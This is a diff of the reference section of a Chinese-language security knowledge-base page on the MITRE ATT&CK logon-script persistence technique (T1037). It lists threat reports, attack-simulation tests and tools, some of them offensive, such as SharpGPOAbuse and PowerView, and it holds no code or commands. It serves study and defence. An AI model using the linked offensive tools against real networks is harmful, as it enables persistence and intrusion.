+- [MITRE ATT&CK - Boot or Logon Initialization Scripts (T1037)](https://attack.mitre.org/techniques/T1037/)
+- [MITRE ATT&CK - Logon Script (Windows) (T1037.001)](https://attack.mitre.org/techniques/T1037/001/)
+- [Microsoft文档 - 组策略登录脚本](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc739085)
 
-### 安全报告
+### 📰 安全报告（真实攻击）
 
-- [Google Cloud - APT41 Arisen From Dust](https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust)
-- [ESET - Turla Crru Entropy](https://www.welivesecurity.com/2020/08/06/turla-crru-entropy/)
-- [CISA - Volt Typhoon Advisory (AA24-038A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)
+- [US DOJ FIN7起诉书](https://www.justice.gov/opa/pr/five-members-sophisticated-cyber-criminal-group-indicted-widespread-hacking-and-bank-fraud) - FIN7利用域登录脚本扩散持久化的官方记录
+- [CrowdStrike APT29分析](https://www.crowdstrike.com/blog/bears-midst-intrusion-discernment/) - APT29在macOS上使用Login Hook的案例分析
 
-### 工具与资源
+### 🔧 工具与资源（动手试试）
 
-- [SharpGPOAbuse - GPO Abuse Tool](https://github.com/FSecureLABS/SharpGPOAbuse)
-- [PowerView - PowerShell AD Enumeration](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
+- [Atomic Red Team T1037](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1037) - T1037原子测试用例
+- [Sysinternals Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) - 查看所有自动启动位置
 
-### 学习资料
+## 版本历史
 
-- [CISA Boot or Logon Initialization Scripts (T1037)](https://www.cisa.gov/eviction-strategies-tool/info-attack/T1037)
-- [Atomic Red Team - T1037 Tests](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1037)
+| 版本 | 日期 | 变更内容 | 变更人 | 审核人 |
+|------|------|----------|--------|--------|
+| v1.0 | 2026-07-10 | 初始入库，修复跨战术污染问题 | ATTCK知识库维护团队 | - |
